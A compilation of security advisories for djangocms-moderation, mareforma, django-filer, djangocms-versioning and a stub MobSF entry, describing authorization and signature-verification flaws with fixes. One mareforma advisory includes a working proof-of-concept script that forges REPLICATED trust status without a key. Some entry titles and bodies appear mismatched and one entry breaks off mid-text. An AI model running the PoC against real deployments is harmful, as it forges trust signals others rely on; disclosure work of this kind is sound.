entry.title: [djangocms-moderation] djangocms-moderation: Moderation comments disclosed to non-participant staff via the admin changelist
entry.content:
Summary

The Django admin views for moderation comments (CollectionCommentAdmin and RequestCommentAdmin) render the full comment body but scope access only by an attacker-controlled id in the URL and Django's model-level view_*comment permission. They perform no per-object participant check. As a result, any authenticated staff user who holds the comment view permission can read the comments of any collection or moderation request — including ones they are not a participant of — simply by supplying the target object's id.

Comments are documented and intended to be private to the participants of a collection (its author and the moderators assigned to its workflow). This advisory concerns a read/write authorization asymmetry: the write paths already enforced request.user == obj.author, but the read paths did not enforce any participant check.

Details

ModerationRequest.user_can_view_comments() — the gate intended to protect comment reads (author or assigned moderator) — existed in the codebase but was never called by the comment admins. Neither CollectionCommentAdmin nor RequestCommentAdmin overrode get_queryset, and their changelist_view / changeform_view methods resolved the target object directly from the user-supplied id without an authorization check.

The changelists are hard-scoped to a single collection / moderation request (they raise Http404 when no id is present), so the exposure is not "all comments at once," but any specific collection's or request's comments can be retrieved by iterating ids.

  • list_display on both admins includes the comment message, so the full body is disclosed directly in the changelist HTML.
  • The individual changeform (.../<id>/change/) discloses the same content via a direct URL.

Impact

  • Type: Information disclosure / broken object-level authorization (IDOR).
  • Confidentiality: Comment contents of collections/requests the user does not participate in are exposed. This can include sensitive internal editorial discussion.
  • Integrity / Availability: No impact — comment creation, editing, and deletion already enforced author checks and are unaffected.
  • Who is affected: Deployments where more than one team/group of staff reviewers holds the view_collectioncomment / view_requestcomment permission. A reviewer of collection A can read the comments of collection B.

Workarounds

Restrict the view_collectioncomment and view_requestcomment model permissions to trusted users only, and avoid granting them across teams that must not see each other's moderation comments. This does not fully close the issue but reduces the set of users who can exploit it. Upgrading is the only complete fix.

Remediation

Upgrade to djangocms-moderation 2.4.1.

The fix adds a user_can_view_comments participant gate (author or assigned moderator) to both comment admins, enforced in changelist_view and changeform_view for both the collection and request comment models. A ModerationCollection.user_can_view_comments() method was added to mirror the existing ModerationRequest.user_can_view_comments(). Non-participants now receive an HTTP 403 (PermissionDenied).

Credit

Reported via coordinated disclosure.

References

  • https://github.com/django-cms/djangocms-moderation/security/advisories/GHSA-pj7p-238h-76pv
  • https://nvd.nist.gov/vuln/detail/CVE-2026-69139
  • https://github.com/django-cms/djangocms-moderation/pull/374
  • https://github.com/django-cms/djangocms-moderation/commit/a044d9c98c127454b73e8a8ada6e59aaa0a8f621
  • https://github.com/django-cms/djangocms-moderation/releases/tag/2.4.0
  • https://github.com/advisories/GHSA-pj7p-238h-76pv

entry.title: [mareforma] Mareforma: Unsigned Claims Can Be Promoted to REPLICATED via Missing Signature Enforcement in Convergence Path
entry.content:
Summary

mareforma 0.3.3 contains a critical integrity flaw in the REPLICATED convergence logic (_maybe_update_replicated_unlocked() in mareforma/db/core.py:1300-1319). The peer-selection SQL query that determines whether two independent claims "agree" on the same anchor does not verify that either claim carries a valid cryptographic signature from an enrolled validator key. Because rekor_enabled=False is the default and automatically sets transparency_logged=1 at insert time, every claim — signed or not — immediately satisfies the convergence precondition. An attacker with no Mareforma key can write an unsigned claim to a shared graph, cause it to converge with a legitimate signed peer claim, and have it promoted to REPLICATED status. The forged REPLICATED row is then returned by the default trust query (graph.query(min_support="REPLICATED")), allowing the attacker to inject false trust signals into any downstream consumer relying on REPLICATED as a multi-party endorsement guarantee.

Details

Root cause — mareforma/db/core.py:1300-1319

The convergence function _maybe_update_replicated_unlocked() selects peer claims using a SQL query that filters on status, unresolved, transparency_logged, and artifact_hash, but contains no predicate on signature_bundle or enrolled-key identity:

# mareforma/db/core.py:1300-1319
rows = conn.execute(
    f"""
    SELECT DISTINCT c.claim_id, c.generated_by
    FROM claims c, json_each(c.supports_json) j
    WHERE j.value IN ({placeholders})
      AND c.claim_id != ?
      AND c.generated_by != ?
      AND c.support_level != 'ESTABLISHED'
      AND c.status = 'open'
      AND c.unresolved = 0
      AND c.transparency_logged = 1
      AND (
          c.artifact_hash IS NULL
          OR ? IS NULL
          OR c.artifact_hash = ?
      )
    """,

Once peer rows are collected, the sink at core.py:1324-1334 promotes all matching claim IDs — including the attacker's — to REPLICATED without any additional validation.

Why the preconditions are trivially satisfied

  1. transparency_logged = 1 is set automatically. When rekor_enabled=False (the library default), core.py:1061 sets transparency_logged = 1 immediately after insert. There is no Rekor step, so every claim becomes convergence-eligible the moment it is written.
  2. require_signed=False is the default. mareforma/__init__.py:41 defaults require_signed to False. When the attacker opens the graph with a non-existent key path, __init__.py:132-138 silently sets signer = None, enabling unsigned claim insertion.
  3. assert_claim() performs no signature gate. _graph.py:284-291 only validates DOI resolution on the supports list before forwarding attacker-controlled fields to _db.add_claim() (_graph.py:373-380).

Why the forged claim surfaces in trust queries

The default query path at core.py:3647-3650 filters out only PRELIMINARY claims whose generator is not enrolled. Claims at REPLICATED status are returned unconditionally, so the unsigned forged row is indistinguishable from a legitimately converged row in any downstream consumer.

The helper that should have been called

core.py:3661-3669 contains _extract_signature_bundle_keyid(), which can extract the key ID from a signature_bundle. This helper exists but is never invoked on the convergence path, indicating the validation was inadvertently omitted rather than a design decision.

Complete data flow (source → sink)

Step Location Description
1 cli.py:700-739 CLI accepts arbitrary TEXT, --supports, --generated-by; lines 720-723 explicitly permit unsigned graph mode
2 __init__.py:128-138 Missing key file → signer = None (no error raised)
3 _graph.py:284-291 assert_claim() forwards user-controlled supports after DOI check only
4 _graph.py:373-380 Calls _db.add_claim() with attacker-controlled claim fields
5 db/core.py:1208-1214 Post-insert convergence triggered when unresolved == False and transparency_logged == 1
6 db/core.py:1300-1319 Peer-selection SQL — no signature_bundle or enrolled-key check (vulnerable sink)
7 db/core.py:1324-1334 Updates peer and attacker claims to REPLICATED
8 db/core.py:3647-3650 Default query returns REPLICATED rows without signature validation

PoC

Prerequisites

python3 -m venv /tmp/mareforma-poc
/tmp/mareforma-poc/bin/pip install mareforma==0.3.3

Or run the fully self-contained Docker image:

# Build (from the repository root, with the local repo mounted under ./repo)
docker build -f vuln-001/Dockerfile -t mareforma-vuln001 .

# Run (no network required)
docker run --rm --network none mareforma-vuln001

Step-by-step attack

#!/usr/bin/env python3
from pathlib import Path
from tempfile import TemporaryDirectory

import mareforma
from mareforma import signing

with TemporaryDirectory() as td:
    root = Path(td)
    key_path = root / "root-key.pem"

    # Step 1: Legitimate root agent bootstraps a key and creates an ESTABLISHED anchor.
    signing.bootstrap_key(key_path)
    with mareforma.open(root, key_path=key_path) as g:
        anchor = g.assert_claim(
            "established anchor",
            classification="DERIVED",
            generated_by="seed/root",
            seed=True,
        )
        # Step 2: Honest peer asserts a signed PRELIMINARY claim supporting the anchor.
        honest = g.assert_claim(
            "same result",
            supports=[anchor],
            generated_by="honest-agent",
        )

    # Step 3: Attacker opens the same graph with a non-existent key path.
    #         __init__.py:132-138 silently sets signer=None — unsigned mode.
    attacker_key = root / "missing-attacker-key.pem"  # does not exist
    with mareforma.open(root, key_path=attacker_key) as g:
        # Step 4: Attacker inserts an unsigned claim supporting the same anchor.
        #         Convergence fires in _maybe_update_replicated_unlocked():
        #           - Two claims share the same ESTABLISHED anchor
        #           - Different generated_by values
        #           - Both have transparency_logged=1 (Rekor disabled by default)
        #           - No signature or enrollment check performed
        attack = g.assert_claim(
            "forged convergence",
            supports=[anchor],
            generated_by="attacker-agent",
        )

        attack_info = g.get_claim(attack)
        print(attack_info["support_level"])          # → REPLICATED
        print(attack_info["signature_bundle"] is None)  # → True (unsigned)

        # Step 5: The unsigned REPLICATED claim appears in the default trust query.
        results = g.query(min_support="REPLICATED")
        for r in results:
            print((r["text"], r["support_level"],
                   r["signature_bundle"] is None, r["generator_enrolled"]))

Expected output

REPLICATED
True
('established anchor', 'ESTABLISHED', False, True)
('forged convergence', 'REPLICATED', True, False)   # ← unsigned, unenrolled
('same result', 'REPLICATED', False, True)

The forged claim (signature_bundle=None, generator_enrolled=False) is promoted to REPLICATED and returned alongside legitimately signed claims.

Remediation

The convergence path must require both the incoming claim and every selected peer claim to carry a valid signature_bundle signed by a distinct enrolled validator key:

--- a/mareforma/db/core.py
+++ b/mareforma/db/core.py
@@
-    new_status_row = conn.execute(
-        "SELECT status FROM claims WHERE claim_id = ?", (new_claim_id,),
+    new_status_row = conn.execute(
+        "SELECT status, signature_bundle FROM claims WHERE claim_id = ?",
+        (new_claim_id,),
     ).fetchone()
     if new_status_row is None or new_status_row["status"] != "open":
         return
+    from mareforma import validators as _validators
+    new_keyid = _extract_signature_bundle_keyid(new_status_row["signature_bundle"])
+    if new_keyid is None or not _validators.is_enrolled(conn, new_keyid):
+        return
@@
-        SELECT DISTINCT c.claim_id, c.generated_by
+        SELECT DISTINCT c.claim_id, c.generated_by, c.signature_bundle
@@
-    if not rows:
+    peer_ids = []
+    for row in rows:
+        peer_keyid = _extract_signature_bundle_keyid(row["signature_bundle"])
+        if peer_keyid is None or peer_keyid == new_keyid:
+            continue
+        if not _validators.is_enrolled(conn, peer_keyid):
+            continue
+        peer_ids.append(row["claim_id"])
+
+    if not peer_ids:
         return
 
-    peer_ids = [r["claim_id"] for r in rows] + [new_claim_id]
+    peer_ids = peer_ids + [new_claim_id]

Impact

This is an integrity bypass vulnerability (CWE-347: Improper Verification of Cryptographic Signature). REPLICATED is mareforma's primary multi-party trust signal, intended to convey that at least two independent, enrolled validators have independently observed and signed the same result. By silently bypassing the signature and enrollment checks in the convergence path, the library allows any local agent — with no cryptographic credentials — to forge this trust signal.

Who is impacted: Any user or system that queries a mareforma graph with min_support="REPLICATED" and treats the result as evidence of multi-party validation. This includes automated pipelines, audit dashboards, policy engines, or downstream consumers that rely on REPLICATED status to gate trust decisions (e.g., accepting a dataset, approving a model artifact, or publishing a result).

Because the forged claim is indistinguishable from a legitimately converged claim in query results, consumers cannot detect the attack without out-of-band inspection of signature_bundle and generator_enrolled fields — fields that the library's default query interface does not surface prominently.

The vulnerability is exploitable in the default configuration: require_signed=False, rekor_enabled=False. The attack requires only local write access to a shared graph database (e.g., a shared filesystem or writable network mount) and no Mareforma key.

Reproduction artifacts

Dockerfile

FROM python:3.12-slim

LABEL description="VULN-001 PoC: Unsigned Claims Promoted to REPLICATED (CWE-347)"
LABEL version="0.3.3"

WORKDIR /app

# Copy the local repository and install from source
COPY repo /app/repo
RUN pip install --no-cache-dir /app/repo

# Copy the proof-of-concept script
COPY vuln-001/poc.py /app/poc.py

CMD ["python3", "/app/poc.py"]

poc.py

#!/usr/bin/env python3
"""
VULN-001 Proof of Concept
Title: Unsigned Claims Promoted to REPLICATED via Missing Signature Enforcement
CWE-347: Improper Verification of Cryptographic Signature
CVSS: 7.1 (High) — CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N

Root cause:
  _maybe_update_replicated_unlocked() in mareforma/db/core.py:1300-1319 selects
  peer claims for convergence without checking signature_bundle or enrolled-key
  identity. When rekor_enabled=False (the default), transparency_logged is set
  to 1 immediately (core.py:1061), so every claim—signed or not—is eligible for
  the convergence query. An attacker with no key can therefore write an unsigned
  claim that converges with a legitimate signed peer claim and is promoted to
  REPLICATED status. The forged REPLICATED row is then returned by the default
  query path (core.py:3647-3650) that only filters unenrolled PRELIMINARY claims.

Attack steps:
  1. Honest root agent bootstraps a key; auto-enrolls as root validator on first
     graph open; asserts an ESTABLISHED seed anchor claim.
  2. Honest agent asserts a signed PRELIMINARY peer claim supporting the anchor.
  3. Attacker opens the same graph WITHOUT any key (missing-key.pem does not
     exist → signer=None per __init__.py:132-138).
  4. Attacker asserts an unsigned PRELIMINARY claim supporting the same anchor.
  5. Convergence fires: two claims, same ESTABLISHED anchor, different
     generated_by, both have transparency_logged=1 (Rekor disabled).
  6. Both claims are promoted to REPLICATED. No signature check is performed.
  7. graph.query(min_support="REPLICATED") returns the unsigned forged claim.

Expected evidence (deterministic exit code 0):
  - attack claim support_level == "REPLICATED"
  - attack claim signature_bundle is None  (unsigned)
  - attack claim generator_enrolled == False
  - forged unsigned REPLICATED claim appears in query results
"""

import sys
from pathlib import Path
from tempfile import TemporaryDirectory

import mareforma
from mareforma import signing


SEPARATOR = "-" * 70


def banner(msg: str) -> None:
    print(f"\n{SEPARATOR}")
    print(f"  {msg}")
    print(SEPARATOR)


def main() -> int:
    print("VULN-001 PoC — Unsigned Claims Promoted to REPLICATED (CWE-347)")
    print(f"mareforma version: {mareforma.__version__}")

    with TemporaryDirectory() as td:
        root = Path(td)
        key_path = root / "root-key.pem"

        # ------------------------------------------------------------------
        # Step 1: Bootstrap a key for the legitimate root agent.
        #         On first graph open, this key auto-enrolls as the root
        #         validator, which is required for seed=True.
        # ------------------------------------------------------------------
        banner("Step 1: Bootstrap signing key for honest root agent")
        signing.bootstrap_key(key_path)
        print(f"  Key path : {key_path}")
        print(f"  Exists   : {key_path.exists()}")

        # ------------------------------------------------------------------
        # Step 2: Honest root agent creates an ESTABLISHED anchor.
        #         Uses seed=True, which requires an enrolled validator.
        #         The first open() with a fresh key auto-enrolls it.
        # ------------------------------------------------------------------
        banner("Step 2: Honest root agent — create ESTABLISHED anchor + signed peer claim")
        with mareforma.open(root, key_path=key_path) as g:
            anchor = g.assert_claim(
                "established anchor",
                classification="DERIVED",
                generated_by="seed/root",
                seed=True,
            )
            anchor_info = g.get_claim(anchor)
            print(f"  anchor claim_id     : {anchor}")
            print(f"  anchor support_level: {anchor_info['support_level']}")
            assert anchor_info["support_level"] == "ESTABLISHED", (
                f"Unexpected anchor level: {anchor_info['support_level']}"
            )

            # Honest agent adds a signed peer claim supporting the anchor.
            honest = g.assert_claim(
                "same result",
                supports=[anchor],
                generated_by="honest-agent",
            )
            honest_info = g.get_claim(honest)
            print(f"  honest claim_id     : {honest}")
            print(f"  honest support_level: {honest_info['support_level']}")
            print(f"  honest signed       : {honest_info['signature_bundle'] is not None}")

        # ------------------------------------------------------------------
        # Step 3: Attacker opens the graph with a non-existent key.
        #         __init__.py:132-138: missing file → signer=None (unsigned mode).
        # ------------------------------------------------------------------
        banner("Step 3: Attacker opens graph WITHOUT a key — unsigned mode")
        attacker_key = root / "missing-attacker-key.pem"
        print(f"  Attacker key path: {attacker_key}")
        print(f"  Attacker key exists: {attacker_key.exists()}  (intentionally absent)")

        with mareforma.open(root, key_path=attacker_key) as g:
            # Step 4: Attacker asserts an unsigned claim with the same anchor.
            #         Convergence logic fires: two claims, same ESTABLISHED
            #         anchor, different generated_by, both transparency_logged=1.
            banner("Step 4: Attacker inserts UNSIGNED claim — triggers convergence")
            attack = g.assert_claim(
                "forged convergence",
                supports=[anchor],
                generated_by="attacker-agent",
            )

            attack_info = g.get_claim(attack)
            attack_support_level = attack_info["support_level"]
            attack_unsigned = attack_info["signature_bundle"] is None
            attack_enrolled = attack_info.get("generator_enrolled", False)

            print(f"  attack claim_id       : {attack}")
            print(f"  attack support_level  : {attack_support_level}")
            print(f"  attack unsigned       : {attack_unsigned}  (signature_bundle is None)")
            print(f"  attack enrolled       : {attack_enrolled}")

            # Step 5: Verify the unsigned REPLICATED claim appears in the
            #         default query that consumers rely on for trust decisions.
            banner("Step 5: Query min_support='REPLICATED' — should include forged claim")
            results = g.query(min_support="REPLICATED")
            print(f"  Total REPLICATED results: {len(results)}")
            forged_in_results = False
            for r in results:
                is_forged = (
                    r["signature_bundle"] is None
                    and r.get("generator_enrolled") is False
                    and r["support_level"] == "REPLICATED"
                )
                marker = "  [FORGED]" if is_forged else "         "
                print(
                    f"{marker} text={r['text']!r:30s} "
                    f"level={r['support_level']:12s} "
                    f"unsigned={r['signature_bundle'] is None!s:5s} "
                    f"enrolled={r.get('generator_enrolled', '?')}"
                )
                if is_forged:
                    forged_in_results = True

        # ------------------------------------------------------------------
        # Verdict
        # ------------------------------------------------------------------
        banner("Verdict")
        conditions = {
            "attack claim support_level == REPLICATED": attack_support_level == "REPLICATED",
            "attack claim is UNSIGNED (signature_bundle is None)": attack_unsigned,
            "attack generator_enrolled == False": attack_enrolled is False,
            "forged REPLICATED claim visible in query results": forged_in_results,
        }
        all_pass = True
        for desc, result in conditions.items():
            status = "PASS" if result else "FAIL"
            print(f"  [{status}] {desc}")
            if not result:
                all_pass = False

        if all_pass:
            print(
                "\n  [CONFIRMED] VULN-001: unsigned claim promoted to REPLICATED.\n"
                "  An attacker without any key can forge graph trust.\n"
                "  The convergence path (core.py:1300-1319) does not check\n"
                "  signature_bundle or enrolled-key identity."
            )
            return 0
        else:
            print(
                "\n  [NOT TRIGGERED] One or more conditions failed.\n"
                "  Vulnerability may have been patched or env differs."
            )
            return 1


if __name__ == "__main__":
    sys.exit(main())

References

  • https://github.com/mareforma/mareforma/security/advisories/GHSA-8776-qf3h-26r3
  • https://nvd.nist.gov/vuln/detail/CVE-2026-71535
  • https://github.com/mareforma/mareforma/pull/18
  • https://github.com/mareforma/mareforma/commit/e1bf09e515693a7f2a2a80852b05fa66be44302e
  • https://github.com/mareforma/mareforma/releases/tag/v0.3.7
  • https://github.com/advisories/GHSA-8776-qf3h-26r3

entry.title: [mareforma] Mareforma: transparency_logged trusts the unsigned rekor block
entry.content:
What's wrong

During restore, transparency_logged is recomputed as 1 if (toml_logged is not False and bundle_has_rekor) else 0, where bundle_has_rekor comes only from a rekor.uuid field inside signature_bundle. That derivation is wrong in both directions.

First, the rekor block is metadata attached after signing (attach_rekor_entry in mareforma/signing/rekor.py leaves the payload and signatures untouched), so it is not covered by the Ed25519 signature. A hand-edited claims.toml can add "rekor": {"uuid": "x"} to any claim's bundle and forge the "publicly witnessed by Rekor" state. The claim signature still verifies, and restore never cross-checks the block against [rekor_inclusions] or the log. Tampering with claims.toml is the exact threat model restore defends against; _verify_claim_signatures_on_restore checks only payload and signatures.

Second, a signed claim in a graph that never used Rekor is written with transparency_logged=1 (the column default when Rekor is disabled) but restores as 0 because its bundle has no rekor block. The convergence gate requires transparency_logged = 1, so post-restore peers can no longer converge to REPLICATED. With no rekor_url configured, refresh_unsigned() is a no-op and the flag stays 0 forever. Observed on the honest path: signed non-Rekor claim restores from transparency_logged=1 to 0, and a subsequent peer stays at PRELIMINARY instead of converging.

Severity and impact

High. An attacker who edits claims.toml can mark claims Rekor-witnessed and REPLICATED-eligible without them ever having been logged. Meanwhile the common honest configuration (signed, no Rekor) has its trust state silently degraded by every catastrophic-loss restore, with no recovery path.

Location

  • mareforma/db/restore.py:376 reads toml_logged from the TOML and probes the bundle for a rekor.uuid
  • mareforma/db/restore.py:385 computes resolved_transparency from the unsigned rekor block alone
  • mareforma/db/core.py:1401 the REPLICATED convergence gate requires c.transparency_logged = 1

Fix direction

Do not derive transparency_logged from an unsigned envelope field. When a rekor block is present, require a matching, cryptographically verified [rekor_inclusions] entry (via verify_rekor_inclusion against the pinned log public key) whose hashedrekord spec.data.hash equals the SHA-256 of the claim's signed payload before setting 1; otherwise set 0.

When the claim is signed and neither the bundle nor the graph carries Rekor coordinates, restore the write-time value: the TOML omits transparency_logged unless it was 0, so treat an absent flag plus no rekor bundle as 1 (the column default for non-Rekor writes).

Do red/green TDD: add a regression test that fails on main, then make it pass.

Quality bar

SOLID, DRY, KISS. Clean, readable, well-tested code. No new errors, warnings, or test failures; the full suite stays green on all supported Python versions.

References

  • https://github.com/mareforma/mareforma/security/advisories/GHSA-xfq4-8hf9-5h43
  • https://nvd.nist.gov/vuln/detail/CVE-2026-71534
  • https://github.com/mareforma/mareforma/pull/58
  • https://github.com/mareforma/mareforma/commit/cccbf4eafd3c34b20b1686f12c0cad76c87566ae
  • https://github.com/mareforma/mareforma/releases/tag/v0.3.8
  • https://github.com/advisories/GHSA-xfq4-8hf9-5h43

entry.title: [mareforma] Mareforma: invalidated claims still promote to REPLICATED
entry.content:
What's wrong

_maybe_update_replicated_unlocked never checks t_invalid, so a claim that a signed contradiction verdict has marked invalid can still climb to REPLICATED through convergence detection, and it pulls an honest peer up with it.

Three gaps line up:

  • The new-claim short-circuit reads only status and asserter_keyid (core.py:1339-1352); an invalidated but still-open new claim passes.
  • The candidate-peer SELECT filters status = 'open', unresolved = 0, and transparency_logged = 1 but has no t_invalid predicate (core.py:1390-1410), so an invalidated existing claim qualifies as a convergence partner.
  • The promotion UPDATE gates only on status = 'open' (core.py:1422-1426), leaving a TOCTOU window even after the SELECT is fixed.

A signed contradiction verdict is meant to be terminal for the trust ladder: validate_claim refuses to promote a t_invalid claim to ESTABLISHED, and record_replication_verdict already gates its promotion UPDATE on t_invalid IS NULL. Convergence promotion is the one path that ignores the verdict. Reproduced at runtime: contradict claim X (t_invalid set, still PRELIMINARY), then assert peer Y sharing X's ESTABLISHED anchor; both X and Y land at REPLICATED, with X's t_invalid still set.

Severity and impact

High. A refuted claim re-enters the trust ladder at REPLICATED after its contradiction, and it serves as the corroborating peer that promotes an honest claim. Both outcomes contradict the documented refutation model, and REPLICATED is the input to further validation.

Location

  • mareforma/db/core.py:1339 new-claim short-circuit checks status and asserter_keyid but not t_invalid
  • mareforma/db/core.py:1390 candidate-peer SELECT WHERE clause has no t_invalid IS NULL predicate
  • mareforma/db/core.py:1422 promotion UPDATE gates on status = 'open' only, reopening the window between SELECT and UPDATE

Fix direction

Treat t_invalid the way the neighboring code already does. Extend the new-claim short-circuit to also read t_invalid and return when it is set. entry.title: [mareforma] Mareforma: verify_bundle never checks a per-claim signature
entry.content:
What's wrong

verify_bundle documents that it verifies "a bundle's DSSE envelope AND each per-claim signature", lists "per-claim signature failure" among its raised errors, and promises that partial verification never surfaces "an authenticated bundle that contains some invalid claims" as success. The code does not do this. The JSON-LD predicate built by JSONLDExporter._claim_node carries no signature material (there is no signatureBundle field on the node), so the verify loop has nothing cryptographic to check per claim. It only re-derives each claim's canonical-statement digest from the node fields and compares it to the signed subject list:

chain_input = _signing.canonical_statement({...node fields...}, node.get("evidence") or {})
expected = hashlib.sha256(chain_input).hexdigest()
if subjects[subject_name] != expected:
    raise BundleVerificationError(...)

That digest check is self-referential: the exporter signs both the subject digests and the predicate nodes with the same key. It confirms the bundle is internally consistent as built, not that each claim's purported asserter ever validly signed it. The existing test test_tampered_claim_text_in_predicate_fails asserts a "digest mismatch", confirming digest-only verification is the actual contract.

Severity and impact

Medium. All trust in a bundle collapses to the single exporter key. Whoever holds it (or a malicious exporter) can emit a bundle containing claims whose asserter signatures are missing, invalid, or forged, and verify_bundle returns success. A relying party reading the docstring believes per-claim authenticity was verified when it was not. Security-sensitive because this is the trust boundary the SCITT-style export exists to provide.

Location

  • mareforma/export_bundle.py:20 module docstring claims verification checks "every per-claim signature inside predicate"
  • mareforma/export_bundle.py:183 verify_bundle docstring promises per-claim signature verification and a per-claim signature failure error
  • mareforma/export_bundle.py:254 verify loop only recomputes and compares canonical-statement digests
  • mareforma/exporters/jsonld.py:178 _claim_node emits no signature field, so the predicate carries nothing to verify per claim

Fix direction

Two honest options. Either export each claim's signature bundle in the JSON-LD predicate and have verify_bundle cryptographically verify it (including the claim_id and subject binding) against the claim's asserter or validator key, raising on the first failure as documented. Or, if per-claim verification is out of scope for the bundle format, correct the module docstring and the verify_bundle docstring to state exactly what is verified: the bundle-level DSSE signature plus internal subject-digest consistency, with per-claim asserter signatures explicitly not checked.

entry.title: [mareforma] Mareforma: search_claims skips verify-on-read, serving forged rows
entry.content:
What's wrong

search_claims never calls _row_verified_on_read. Its row loop applies only the PRELIMINARY-unenrolled filter, then appends the row. query_claims runs the same projection but additionally re-verifies REPLICATED/ESTABLISHED signatures on read (line 4023) and drops any row that fails, per the documented tamper guarantee in the comment block above it: a high-trust row whose signature does not verify is excluded from query results entirely.

So a tampered or forged high-trust row splits the two read paths. Any process with DB write access, or an attacker copying a genuine validation envelope onto a fresh row, can flip a row to ESTABLISHED. query() drops it; search() serves it at its persisted trust level. Verified in a runtime check against a forged ESTABLISHED row:

query() returns forged row: False
search() returns forged row: True   # support_level ESTABLISHED, 'verified' key absent

The docstring makes this worse: search_claims promises "the same projection as query_claims" and that the include_unverified filter "applies identically", so callers reasonably trust search results equally. The forged row also lacks the verified key entirely, so a consumer cannot tell it went unchecked.

Severity and impact

High. The verify-on-read tamper exclusion is a stated trust guarantee, and search is a primary read surface. A forged ESTABLISHED finding that query correctly rejects is served by search as genuine, with no marker that verification was skipped.

Location

  • mareforma/db/core.py:4206 search_claims row loop applies only the PRELIMINARY-unenrolled filter, then appends
  • mareforma/db/core.py:4114 search_claims signature and docstring, which claims query_claims-identical semantics
  • mareforma/db/core.py:4023 query_claims verify-on-read call that search_claims lacks

Fix direction

Mirror query_claims: add a verify_cache: dict = {} and, inside the search_claims row loop after the include_unverified check, drop rows that fail _row_verified_on_read(conn, d, verify_cache). Since the verify filter can drop rows even when include_unverified=True, remove the single-batch break on include_unverified and keep batching until limit survivors or the FTS5 match-set is exhausted, with the same scan ceiling query_claims uses. Also set single_trust_domain / trust_domain_root on surviving ESTABLISHED rows if the "same projection" promise is to hold.

entry.title: [django-filer] django-filer: Missing per-object authorization on `discard` and `edit_redirect` version transitions
entry.content:
Summary

When django-filer's optional per-folder permission system is enabled (FILER_ENABLE_PERMISSIONS=True), the "Delete files and/or folders" admin action does not enforce per-folder edit permissions the way every other mutating action does. A staff user who is scoped read-only on a folder via FolderPermission (can_edit = DENY), but who holds the global Django model-level delete_* permission, can delete files and entire subfolders inside that folder — even though their move, rename, copy, and resize actions on the same folder are correctly denied.

This is an integrity / edit-control gap (unauthorized deletion). It is not a read-confidentiality issue: filer files are world-downloadable by design, so no confidentiality claim is made.

Affected versions

  • django-filer <= 3.4.4 (verified end-to-end on 3.4.4 and on master prior to the fix).

Only installations running with FILER_ENABLE_PERMISSIONS = True (the optional per-folder FolderPermission system) are affected. Deployments that leave permissions disabled (the default) rely solely on Django model-level permissions and are not impacted by this specific gap.

Patched versions

  • Fixed in PR #1605. Upgrade to the first release containing that commit (3.5.0 or later).

Details

The delete_files_or_folders admin action in filer/admin/folderadmin.py authorized deletion using only:

  1. self.has_delete_permission(request) — which returns True for obj=None, and
  2. the Django model-level delete_file / delete_folder / delete_image permission (enforced downstream by the admin delete machinery).

It never called check_folder_edit_permissions or check_files_edit_permissions. Every sibling mutating action — move, rename, copy, resize — does call these helpers, which walk the selected objects (and their descendants) and enforce the per-folder can_edit grant from FolderPermission.

Because FolderPermission has no dedicated can_delete field, deletion is treated as an edit/management operation and is gated elsewhere on can_edit. The delete action's omission therefore let a folder-scoped read-only user bypass the per-folder control that constrains all their other write operations.

Precondition

The attacker must hold the Django model-level delete_file / delete_folder / delete_image permission. A purely read-only user (no model-level delete perm) receives 403 and cannot exploit this. This precondition matches the standard folder-scoped-staff deployment model, where staff hold model-level permissions and are further constrained per-folder by FolderPermission.

Mitigation

  • Upgrade to the patched release.
  • Until upgrading, avoid granting the model-level delete_file / delete_folder / delete_image permission to staff who are meant to be read-only on specific folders via FolderPermission.

Credit

Reported through coordinated disclosure. Fixed in PR #1605.

entry.title: [djangocms-versioning] djangocms-versioning: Authorization Bypass Through User-Controlled Key and Missing Authorization
entry.content:
Summary

The discard and edit_redirect version transitions did not enforce a per-object change-permission check, while the sibling transitions (archive, publish, unpublish, revert) all did. As a result a low-privileged staff user could discard (delete) any draft version — and thereby the underlying content object — of content they have no change permission on, and could create an editable draft off any published version, by supplying a version primary key they should not have access to (an insecure direct object reference).

Details

Version state transitions are guarded by Conditions objects declared on djangocms_versioning.models.Version. Every transition that mutates content carries the user_can_change condition, which delegates to the content object's own permission check (Version.has_change_permission → content.has_change_permission / has_placeholder_change_permission, with a final fallback to the Django change_<model> permission).

Two conditions were missing that check:

# Before (vulnerable)
check_discard = Conditions([
    in_state([constants.DRAFT], not_draft_error),
    is_not_locked(lock_error_message),
])
check_edit_redirect = Conditions([
    in_state([constants.DRAFT, constants.PUBLISHED], _("Version is not in draft or published state")),
    draft_is_not_locked(lock_draft_error_message),
])

The corresponding admin views authorize only through these conditions:

  • VersionAdmin.discard_view / VersionAdmin.edit_redirect_view fetch the target with the stock ModelAdmin.get_object, which is backed by the unfiltered default queryset — no per-user or per-grouper scoping.
  • The views are registered with admin_site.admin_view, which enforces only is_staff.
  • discard_view deletes the version directly via version.delete() and never consults VersionAdmin.has_delete_permission (which otherwise delegates to the content admin and honors ALLOW_DELETING_VERSIONS).

Because the only per-object gate for these two operations was the Conditions list, and that list omitted user_can_change, any staff user could invoke the operation on any version by its primary key. The changelist action buttons are disabled in the UI via check_discard.as_bool / check_edit_redirect.as_bool, but that is a client-side affordance only and does not protect the directly reachable admin URLs.

Impact

  • Type: Broken access control / missing authorization (IDOR).
  • Who is affected: Multi-editor deployments where staff users hold differentiated per-object permissions.
    • Under CMS_PERMISSION = True, authorization for these two operations was effectively reduced to is_staff, so any staff user could discard or edit-redirect any version.
    • Under the default CMS_PERMISSION = False, it degrades to the global change_<model> permission (e.g. cms.change_page) — weaker than the intended per-object check, but not absent.
  • Consequence: Unauthorized deletion of draft versions and their content objects (integrity/availability of content), and unauthorized creation of drafts from published content.

Patches

Fixed by adding the user_can_change condition to both check_discard and check_edit_redirect, restoring parity with the other content-mutating transitions:

# After (fixed)
check_discard = Conditions([
    in_state([constants.DRAFT], not_draft_error),
    user_can_change(change_permission_error),
    is_not_locked(lock_error_message),
])
check_edit_redirect = Conditions([
    in_state([constants.DRAFT, constants.PUBLISHED], _("Version is not in draft or published state")),
    user_can_change(change_permission_error),
    draft_is_not_locked(lock_draft_error_message),
])

discard intentionally requires change permission (not delete): it is treated as undoing changes to a draft.

Upgrade to djangocms-versioning 2.6.1 or later.

Workarounds

There is no configuration-only workaround. Operators who cannot upgrade immediately should restrict staff accounts to trusted users, since the missing gate reduces to is_staff under CMS_PERMISSION = True.

entry.title: [mobsf] Mobile Security Framework (MobSF) Allows Web Server Resource Exhaustion via ZIP of Death Attack
entry.content:
Vulnerable MobSF Versions: <= v4.3.2

